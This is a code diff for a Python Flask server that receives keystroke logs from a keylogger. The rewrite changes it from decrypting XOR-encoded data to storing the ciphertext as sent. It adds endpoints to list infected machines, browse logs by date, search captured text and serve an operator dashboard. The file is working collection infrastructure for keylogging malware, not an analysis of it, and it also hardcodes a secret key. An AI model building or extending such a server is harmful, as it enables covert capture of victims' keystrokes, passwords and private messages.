@@ -1,98 +1,175 @@
 # -*- coding: utf-8 -*-
-
-from flask import Flask, jsonify, request
-import os
+from flask import Flask, jsonify, request, send_from_directory, redirect, url_for
 import time
-import codecs
+from pathlib import Path
+
+# --------------------------------
+# Configuration des chemins
+# --------------------------------
+BASE_DIR    = Path(__file__).resolve().parent          # dossier server/
+CLIENT_DIR  = (BASE_DIR.parent / "client").resolve()   # dossier client/
+DATA_FOLDER = BASE_DIR / "data"                        # data stockées dans server/data/
+DATA_FOLDER.mkdir(parents=True, exist_ok=True)
+
+SECRET_KEY = "avi"   # la vraie clé reste côté agent / front
+PORT = 5001
 
 app = Flask(__name__)
 
-# הגדרת נתיב תיקיית הנתונים
-DATA_FOLDER = "data"
-
-# הגדרת המפתח הסודי לפענוח
-# הערה: ביישום אמיתי, מפתח זה צריך להיות מאוחסן בצורה מאובטחת יותר.
-SECRET_KEY = "avi"
-
-
-def xor_decrypt(cipher_hex: str, key: str, encoding: str = "utf-8") -> str:
-    """
-    מפענח טקסט מוצפן בפורמט הקס באמצעות אותו מפתח (string).
-    """
-    if not key:
-        raise ValueError("המפתח לא יכול להיות ריק")
-
-    cipher_bytes = bytes.fromhex(cipher_hex)
-    key_bytes = key.encode(encoding)
-
-    plain_bytes = bytes([
-        b ^ key_bytes[i % len(key_bytes)]
-        for i, b in enumerate(cipher_bytes)
-    ])
-    # print(plain_bytes.decode(encoding))
-    return plain_bytes.decode(encoding)
-
-# def xor_decrypt_bytes(data: bytes, key: str) -> bytes:
-#     """פענוח XOR על רצף בייטים"""
-#     key_bytes = key.encode("utf-8")
-#     decrypted = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
-#     return decrypted
-
-
-@app.route('/')
+# --------------------------------
+# Route par défaut
+# --------------------------------
+@app.route("/")
 def home():
-    return "KeyLogger Server is Running"
+    return "KeyLogger Server is Running (chiffrement côté client uniquement)"
 
-
-@app.route('/api/save_data', methods=['POST'])
+# --------------------------------
+# API: enregistrement (chiffré uniquement)
+# --------------------------------
+@app.route("/api/save_data", methods=["POST"])
 def save_data():
-    """
-    מקבל נתונים מוצפנים מהקיילוגר, מפענח אותם ושומר בקובץ.
-    """
-    data = request.get_json()
-    print(data)
-    # בדיקה שה־payload תקין
-    if not data or "machine_name" not in data or "data" not in data:
-        return jsonify({"error": "Invalid payload"}), 400
+    data = request.get_json(silent=True) or {}
+    machine = str(data.get("machine_name", "")).strip()
+    cipher  = str(data.get("data", "")).strip()
 
-    machine = data["machine_name"]
-    encrypted_hex_data = data["data"]
-    print(machine,encrypted_hex_data)
-    # --- שלב הפענוח ---
-    try:
-        log_data = xor_decrypt(encrypted_hex_data, SECRET_KEY)
-        print(log_data)
-    except Exception as e:
-        # טיפול בשגיאת פענוח
-        return jsonify({"error": f"Decryption failed: {str(e)}"}), 500
+    if not machine or not cipher:
+        return jsonify({"error": "machine_name and data required"}), 400
 
-    # יצירת תיקייה למכונה אם היא לא קיימת
-    machine_folder = os.path.join(DATA_FOLDER, machine)
-    print(machine_folder)
+    # Préfixer si besoin
+    if not cipher.startswith("ENC:"):
+        cipher = "ENC:" + cipher
 
-    if not os.path.exists(machine_folder):
-        print(111)
-        os.makedirs(machine_folder)
+    # Créer dossier machine
+    machine_dir = DATA_FOLDER / machine
+    machine_dir.mkdir(parents=True, exist_ok=True)
 
-    # שימוש בשם קובץ יומי
+    # Fichier par date
     date_str = time.strftime("%Y-%m-%d")
-    filename = f"log_{date_str}.txt"
-    file_path = os.path.join(machine_folder, filename)
-    print("file_path",file_path)
-    # הוספת חותמת זמן לכל שורה
-    timestamp = time.strftime("[%Y-%m-%d %H:%M:%S]")
-    line_to_write = f"{timestamp} - {log_data}\n"
+    file_path = machine_dir / f"log_{date_str}.txt"
+    ts = time.strftime("[%Y-%m-%d %H:%M:%S]")
 
-    # כתיבה לקובץ
+    # Écrire en l'état
     with open(file_path, "a", encoding="utf-8") as f:
-        f.write(line_to_write)
+        f.write(f"{ts}\t{cipher}\n")
 
-    return jsonify({"status": "success", "file": file_path}), 200
+    return jsonify({"status": "success", "file": str(file_path)}), 200
 
+# --------------------------------
+# API: recherche (renvoie données chiffrées)
+# --------------------------------
+@app.route("/api/search", methods=["GET"])
+def search_logs():
+    machine = (request.args.get("machine_name") or "").strip()
+    date_str = (request.args.get("date") or "").strip()
+    query    = (request.args.get("q") or "").strip().lower()
 
+    terms = [t for t in query.split() if t]
+    results = []
 
-if __name__ == '__main__':
-    # יצירת תיקיית הנתונים אם היא לא קיימת בעת הפעלת השרת
-    if not os.path.exists(DATA_FOLDER):
-        os.makedirs(DATA_FOLDER)
-    app.run(debug=True)
+    files_to_check = []
+    if machine:
+        machine_dir = DATA_FOLDER / machine
+        if not machine_dir.is_dir():
+            return jsonify({"count": 0, "results": []}), 200
+        if date_str:
+            files_to_check.append(machine_dir / f"log_{date_str}.txt")
+        else:
+            files_to_check.extend(sorted(machine_dir.glob("log_*.txt")))
+    else:
+        for machine_dir in sorted(DATA_FOLDER.glob("*")):
+            if machine_dir.is_dir():
+                if date_str:
+                    files_to_check.append(machine_dir / f"log_{date_str}.txt")
+                else:
+                    files_to_check.extend(sorted(machine_dir.glob("log_*.txt")))
+
+    # Lire les fichiers (mais pas de décryptage ici)
+    for path in files_to_check:
+        if path.exists():
+            machine_name = path.parent.name
+            log_date     = path.stem.replace("log_", "")
+            with open(path, "r", encoding="utf-8") as f:
+                for line in f:
+                    L = line.rstrip("\n")
+                    if not terms or any(term in L.lower() for term in terms):
+                        results.append({"machine": machine_name, "date": log_date, "line": L})
+
+    return jsonify({"count": len(results), "results": results}), 200
+
+# --------------------------------
+# API: liste des machines
+# --------------------------------
+@app.route("/api/machines", methods=["GET"])
+def list_machines():
+    machines = []
+    if DATA_FOLDER.is_dir():
+        for d in sorted(DATA_FOLDER.iterdir()):
+            if d.is_dir():
+                machines.append(d.name)
+    return jsonify({"machines": machines}), 200
+
+# --------------------------------
+# API: liste des dates pour une machine
+# --------------------------------
+@app.route("/api/dates", methods=["GET"])
+def list_dates_for_machine():
+    machine = (request.args.get("machine_name") or "").strip()
+    if not machine:
+        return jsonify({"error": "machine_name required"}), 400
+
+    machine_dir = DATA_FOLDER / machine
+    if not machine_dir.is_dir():
+        return jsonify({"machine": machine, "dates": []}), 200
+
+    dates = [p.stem.replace("log_", "") for p in machine_dir.glob("log_*.txt")]
+    dates.sort(reverse=True)
+    return jsonify({"machine": machine, "dates": dates}), 200
+
+# --------------------------------
+# API: lire contenu brut (chiffré) d'un fichier
+# --------------------------------
+@app.route("/api/log", methods=["GET"])
+def read_single_log():
+    machine = (request.args.get("machine_name") or "").strip()
+    date_str = (request.args.get("date") or "").strip()
+    if not machine or not date_str:
+        return jsonify({"error": "machine_name and date required"}), 400
+
+    file_path = DATA_FOLDER / machine / f"log_{date_str}.txt"
+    if not file_path.exists():
+        return jsonify({"machine": machine, "date": date_str, "lines": []}), 200
+
+    with open(file_path, "r", encoding="utf-8") as f:
+        lines = [line.rstrip("\n") for line in f]
+    return jsonify({"machine": machine, "date": date_str, "lines": lines}), 200
+
+# --------------------------------
+# Routes pour servir le front (client/)
+# --------------------------------
+@app.route("/client/")
+@app.route("/client/<path:filename>")
+def serve_client(filename="index.html"):
+    return send_from_directory(str(CLIENT_DIR), filename)
+
+@app.route("/client")
+def serve_client_no_slash():
+    return redirect(url_for("serve_client"))
+
+@app.route("/search")
+def alias_search():
+    return send_from_directory(str(CLIENT_DIR), "search.html")
+
+@app.route("/manager")
+def alias_manager():
+    return send_from_directory(str(CLIENT_DIR), "manager.html")
+
+@app.route("/log")
+def alias_log():
+    return send_from_directory(str(CLIENT_DIR), "log.html")
+
+# --------------------------------
+# Run server
+# --------------------------------
+if __name__ == "__main__":
+    print(f"🚀 Flask running on http://127.0.0.1:{PORT}")
+    app.run(debug=True, port=PORT)
